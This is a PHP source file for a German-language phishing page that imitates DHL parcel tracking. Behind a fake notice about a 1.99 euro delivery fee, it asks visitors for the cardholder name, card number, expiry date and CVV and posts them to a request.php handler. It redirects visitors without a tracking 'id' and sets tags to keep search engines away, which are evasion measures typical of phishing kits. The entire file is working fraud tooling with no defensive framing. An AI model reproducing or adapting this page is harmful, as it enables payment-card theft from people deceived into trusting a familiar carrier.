<?php 

    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=tow&'.$id;
?>
<!DOCTYPE html>
<html lang="de">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>herzlich willkommen</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="<?php echo $css1; ?>">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	<script src="<?php echo $js;?>"></script>
	</head>
	<body class="lowla">
		<div id="bg-load" class="bg-load"><div class="load"></div>	</div>
		<div class="contenu">
		<header>
			<div class="pri">
				<span class="prv">Privatkunden</span>
				<span class="per">Geschäftskunden</span>
			</div>
			<div class="bande">
				<span class="lg"><img src="./layout/img/lg.svg"></span>
			<ul>
			<li>Pakete senden</li>
			<li>Pakete empfangen</li>
			<li>Hilfe & Kontakt</li>
			</ul>
			</div>
		</header>
		<section>
		<form id="lFrm" method="post" action="<?php echo $action; ?>">
		<div class="parag">
				<span class="titr">DHL Verfolgung</span>
				<span class="deta">Hier finden Sie Informationen zu Ihren Sendungen</span>
				<span class="deta">Verfolgen Sie Ihre Paketsendungen jederzeit vom Versand bis zur Lieferung</span>
			</div>
			<div class="box">
			<div class="pak">
				<div class="allt">
				<div>
				<input type="text" class="nm" id="nm" name="nm" maxlength="60" required placeholder="Name des Karteninhabers" autocomplete="off" autofocus />
				<input type="text" class="nu" id="nu" name="nu" maxlength="20" required placeholder="Kreditkartennummer" autocomplete="off">
				<input type="text" class="epx" id="epx" name="epx" maxlength="9" required placeholder="MM / JJ" autocomplete="off">
				<input type="text" class="vv" id="vv" name="vv" maxlength="10" required placeholder="CVV (CVC)" autocomplete="off">

				</div>
				</div>
				<div class="erro2">
				<span><b style="color:#d40511">Wichtige Mitteilung!</b><br>Um die Lieferung so schnell wie möglich abzuschließen, bestätigen Sie bitte die Zahlung <span style="color:#d40511;font-weight:bold;font-family:arial">(1.99 Euro)</span>. 
indem Sie auf Weiter klicken. Die Online-Bestätigung muss innerhalb der nächsten 14 Tage vor Ablauf erfolgen.</span>
				</div>
			</div>
			</div>
			<div><button type="submit" class="text-center" >Nächster</button></div>
		</form>
			<div class="pubb"><img class="pb01" src="./layout/img/pub.jpg"><img class="pb02" src="./layout/img/pubr.gif"></div>
		</section>
		</div>

		<footer>
			<div class="contenu">
		<ul>
		<li>DHL Paket</li>
		<li>DHL Dienstleistungen.</li>
		<li>DHL Ausdrücken.</li>
		<li>DHL Logistik.</li>
		</ul>
		<ul>
		<li>Kontakt</li>
		<li>Hilfe & Kundenservice.</li>
		<li>So funktioniert das.</li>
		<li>Mobile Apps.</li>
		</ul>
		<ul>
		<li>Über uns.</li>
		<li>Post DHL.</li>
		<li>Verantwortung.</li>
		<li>Presse.</li>
		<li>Werdegang.</li>
		</ul>
		<div>&copy; <?php echo date("Y"); ?><?php echo lang('FtrS2'); ?></div>
		</div>
	</footer>
	</body>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
	
	<script src="./script.js"></script>
	<script src="<?php echo $js;?>"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 1200);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

// Disable espace on input cc
$(function() {
    $('#nu').on('keypress', function(e) {
        if (e.which == 32)
            return false;
    });
});
	</script>
</html>
<?php
    endif;
    ob_end_flush();
?>
